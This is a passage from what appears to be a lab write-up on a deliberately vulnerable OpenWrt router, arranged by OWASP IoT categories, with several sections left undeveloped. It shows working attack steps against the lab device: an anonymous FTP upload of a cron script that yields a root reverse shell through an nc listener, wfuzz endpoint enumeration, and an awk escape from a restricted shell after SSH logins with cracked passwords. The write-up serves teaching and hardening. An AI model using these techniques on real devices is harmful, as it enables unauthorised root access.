Name (192.168.1.1:maxgarci): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mkdir cron-tmp
257 Operation successful
ftp> cd cron-tmp
250 Operation successful
ftp> put backup.sh
local: backup.sh remote: backup.sh
229 EPSV ok (|||39467|)
150 Ok to send data
100% |******************************************************|    96        1.12 MiB/s    00:00 ETA
226 Operation successful
96 bytes sent in 00:00 (107.02 KiB/s)
ftp> dir
229 EPSV ok (|||32795|)
150 Directory listing
-rw-r--r--    1 1001     1001            96 Jun 23 22:20 backup.sh
226 Operation successful
ftp> 
```

```shell
❯ nc -lvnp 4646
Listening on 0.0.0.0 4646
Connection received on 192.168.1.1 51360


/bin/sh: can't access tty; job control turned off
BusyBox v1.36.1 (2025-06-23 20:40:36 UTC) built-in shell (ash)

/tmp/cron-tmp # id
uid=0(root) gid=0(root) groups=0(root)
/tmp/cron-tmp # 
```
# IoT:I5: Using Insecure or Outdated Components
## Definition

> Use of deprecated or insecure software components/libraries that could allow the device to be compromised. This includes insecure customization of operating system platforms, and the use of third-party software or hardware components from a compromised supply chain.

**ID:** `IoT5-001`  
**Severity:** High  
**Affected Component:** SSH Service (Dropbear)  
**Firmware Version:** OpenWrt 24.10.3 (Custom/VulnZoo)

---

> **NEEDS CHECK: Overlaps with [[IoT Vulnerabilities#IoT I3 - Insecure Ecosystem Interfaces]]**

By using wordlists for endpoints, we can find out firsthand that there is a `/cgi-bin/luci/admin` subroutine. This is revealed by the fact that we get a `Forbidden 403` code, compared to non-existent routes that report a `Not Found 404`.

```bash
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/FUZZ"      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/FUZZ
Total requests: 3

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   404        54 L     121 W      1658 Ch     "foobar"                                                                                                                     
000000001:   404        54 L     121 W      1658 Ch     "system"                                                                                                                     
000000002:   403        90 L     207 W      2889 Ch     "admin"                                                                                                                      

Total time: 0
Processed Requests: 3
Filtered Requests: 0
Requests/sec.: 0
```

However, due to the configuration of `dispatcher.lua`, starting from a valid subroutine, the rest of the subdirectories do not report a `Not Found` error even if they do not exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ"                                            
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   403        91 L     208 W      2897 Ch     "foobar"                                                                                                                     
000000002:   403        91 L     208 W      2896 Ch     "admin"                                                                                                                      
000000001:   403        91 L     208 W      2897 Ch     "system"                                                                                                                     
000000004:   403        91 L     208 W      2896 Ch     "tried"                                                                                                                      

Total time: 0.158685
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 25.20710
```

We cannot differentiate between which endpoints exist and which do not based on what the server reports. However, if we test the interface a little, we notice some strange behavior.

![[iot3_interface_exposes_endpoint.png]]

If we try to access a directory that is unlikely to exist, such as `/cgi-bin/luci/admin/foobar`, we see a message overlaying that the resource does not exist. If we try fuzzing with incorrect login data, we can see that there are changes between different requests, which tells us which subroutes exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   403        94 L     219 W      3005 Ch     "system"                                                                                                                     
000000003:   403        98 L     231 W      3109 Ch     "foobar"                                                                                                                     
000000002:   403        98 L     231 W      3108 Ch     "admin"                                                                                                                      
000000004:   403        98 L     231 W      3108 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0


```

As you can see, subroutes that do not have the message take up less space, and despite the `Forbidden` code in all requests, it is now possible to discern which ones do exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   403        94 L     219 W      3011 Ch     "admin"                                                                                                                      
000000003:   403        98 L     231 W      3116 Ch     "foobar"                                                                                                                     
000000001:   403        94 L     219 W      3012 Ch     "system"                                                                                                                     
000000004:   403        98 L     231 W      3115 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0
```

We have obtained the endpoints `/cgi-bin/luci/admin/system/admin` and `/cgi-bin/luci/admin/system/system`.

---

![[iot5_no-ssh-keys.png]]

Initially, we find that we cannot access the router directly as root due to a device policy issue. We have more information on why this is the case in [[IoT Vulnerabilities#IoT I9 - Insecure Default Settings|IoT9]].

![[iot5_ssh_root_failed.png]]

If we analyze the interface a little, we can start with an analysis of the router's response and realize that there are two headers that suggest that parts of the router interface API are part of the development team's debugging.

![[iot5_x_debug_mode.png]]

Hemos analizado la interfaz web realizando un fuzzing externo, comprobando que se pueden filtrar algunos endpoints que son accesibles como `/api` y `/tools`. Por otro lado, encontramos un endpoint `/debug` que hace referencia a la cabecera anteriormente encontrada que exponía la posibilidad de endpoints de *debugging* que no han sido correctamente ocultados o eliminados.

![[iot5_interface_fuzzing.png]]

We can find another subdirectory that completes an already usable path through another analysis with `wfuzz`:

![[iot5_debug_ssh.png]]



![[iot5_ssh_key_injection.png]]


# IoT:I6 - Insufficient privacy protection
## Definition
> User's personal information stored on the device or in the ecosystem that is used insecurely improperly, or without permission.
> **NOT DEVELOPED**
# IoT:I7 - Insecure Data Transfer and Storage
## Definition
> Lack of encryption or access control of sensitive data anywhere within the ecosystem, including at rest, in transit, or during processing.
> **NOT DEVELOPED**
# IoT:I8 - Lack of device management
## Definition
> Lack of security support on devices deployed in production, including asset management, update management, secure decommissioning, systems monitoring, and response capabilities.
> **NOT DEVELOPED**
# IoT:I9 - Insecure Default Settings
## Definition
> Devices or systems shipped with insecure default settings or lack the ability to make the system more secure by restricting operators from modifying configurations.
### Restricted shell bypass

The `openwrtuser` account is a non-privileged user on the router. The system includes multiple user accounts, but the most relevant are `openwrtuser`, `root`, and `anonymous`. The `anonymous` user is used for anonymous logins to the **FTP** service. In contrast, `openwrtuser` has highly restricted permissions, with the ability to list certain parts of the system and a restricted shell that limits the available commands. This user was created to serve as a bridge account.

For security reasons, direct SSH access to an embedded device as the administrator or `root` user should be avoided. Disabling SSH access for `root` is not a common practice in IoT devices, but it should be adopted to enhance security.

Many IoT product developers do not implement this practice for several reasons:

1. **Simplicity:** Managing a single user is easier.
2. **Storage constraints:** Adding sudo/su increases memory usage.
3. **Technical support:** It is simpler to instruct users to "log in as root."
4. **Legacy compatibility:** Many legacy scripts assume the use of the `root` account.
5. **Cost:** The primary focus is product functionality; security hardening is often considered an unnecessary expense, leading to common security weaknesses.

In enterprise devices, where security is critical due to the potential for revenue loss and reputational damage, more robust security mechanisms are implemented. For example, Cisco network devices employ a hierarchical two-level command execution model that is considered an industry standard:

1. **User EXEC Mode (Non-privileged):** Allows access only to basic diagnostic and viewing commands.
2. **Privileged EXEC Mode (Privileged):** Grants full access to all commands.

These modes are not mutually exclusive; administrators must first access user mode and then authenticate to escalate to privileged mode.

A similar approach has been implemented in this laboratory. SSH access as the `root` user has been disabled on the device.

```zsh
config dropbear
        option Interface 'lan'
        option PasswordAuth 'on'
        option RootPasswordAuth 'off'
        option Port '22'
        # option BannerFile '/etc/banner'
        option MaxAuthTries '3'
        option RecvWindowSize '1048576'
        option SendWindowSize '1048576'

        # Security settings for management
        # option IdleTimeout '300'
        option enable '1'
```

An administrator can only obtain `root` access by first logging in via SSH as `openwrtuser` and then escalating privileges to `root` from within the session using `su` command.

The primary risk in this scenario lies in the restricted shell assigned to the `openwrtuser` account. As previously demonstrated in the section [[IoT Vulnerabilities#IoT I1 - Weak, Guessable, or Hardcoded Passwords]], the user's password can be cracked using the username and a common brute-force dictionary. Additionally, physical access methods are possible, as detailed in [[IoT Vulnerabilities#IoT I10 - Lack of Physical Hardening]], and the firmware can also be obtained for further analysis ([see reference](https://github.com/scriptingxss/owasp-fstm)).

Once access is gained, a user can analyze the behavior of the deployed shell. This can be achieved by reviewing the source code in the repository or by locating and extracting the binary for reverse engineering. The _rshell_ implementation permits the execution of the `awk` command without proper validation.

According to [GTFobins](https://gtfobins.github.io/gtfobins/awk/), it is possible to leverage `awk` to spawn a shell.

```zsh
awk 'BEGIN {system("/bin/sh")}'
```

There are various methods to attempt bypassing a restricted shell. This [resource](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) lists several techniques, including the use of `awk`.

## Demonstration

```zsh
$ sshpass -p "incrackeable" ssh root@192.168.2.1                                                 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Permission denied, please try again.
```

```zsh
$ sshpass -p "openwrtuserpwned" ssh openwrtuser@192.168.2.1
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

██████╗ ███████╗███████╗████████╗██████╗ ██╗ ██████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗  ███████╗   ██║   ██████╔╝██║██║        ██║   █████╗  ██║  ██║
██╔══██╗██╔══╝  ╚════██║   ██║   ██╔══██╗██║██║        ██║   ██╔══╝  ██║  ██║
██║  ██║███████╗███████║   ██║   ██║  ██║██║╚██████╗   ██║   ███████╗██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚═════╝ 
                                                                              
 ██████╗███████╗██╗  ██╗███████╗██╗     ██╗                                  
██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║                                  
██║     ███████╗███████║█████╗  ██║     ██║                                  
██║     ╚════██║██╔══██║██╔══╝  ██║     ██║                                  
╚██████╗███████║██║  ██║███████╗███████╗███████╗                             
 ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                             

===============================================================================
                         RESTRICTED ACCESS SHELL
===============================================================================

╔═══════════════════════════════════════════════════════════════════════════╗
║ WARNING: UNAUTHORIZED ACCESS IS PROHIBITED                                ║
║                                                                           ║
║ This system is for authorized use only. All activities on this system     ║
║ are monitored and logged. Any unauthorized access, use, or modification   ║
║ is strictly prohibited and may result in disciplinary action and/or       ║
║ criminal prosecution under applicable laws.                               ║
║                                                                           ║
║ By accessing this system, you acknowledge that:                           ║
║  • You have no expectation of privacy                                     ║
║  • All keystrokes and commands are logged                                 ║
║  • System administrators may monitor activity at any time                 ║
╚═══════════════════════════════════════════════════════════════════════════╝

Use 'help' command to see the list of allowed commands.

===============================================================================
rshell> netstat 
Command not allowed nor found.
rshell> awk 'BEGIN {system("/bin/sh")}'


BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ $
~ $ netstat -tulnp
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.2.1:22          0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      -
tcp        0      0 :::5515                 :::*                    LISTEN      -
udp        0      0 :::547                  :::*                                -
```


### FTP configuration and escalation

There are multiple insecure configurations present on the device, one of the most critical being the configuration of the [[IoT Vulnerabilities#FTP|FTP]] service. This service allows any user logging in as _anonymous_ to upload executable files to the _/tmp_ directory. This creates a significant attack surface for the execution of malware or ransomware.

To mitigate this issue, it is recommended to create a dedicated directory for the FTP service, restrict access to prevent anonymous logins, and mount the directory used for file uploads with the _noexec_ option to prevent execution of uploaded files.*

```zsh
mount -o remount,noexec /tmp/ftp
```
### Exposed services running as root

Existen en el router servicios que se ejecutan bajo el usuario `root`, lo cual abre una superficie vulnerable a que si se vulnera el servicio se puede obtener acceso privilegiado directo.
## IoT:I10 - Lack of Physical Hardening
### Definition
> Lack of physical hardening measures, allowing potential attackers to gain sensitive information that can help in a future remote attack or take local control of the device.
> **NOT DEVELOPED**
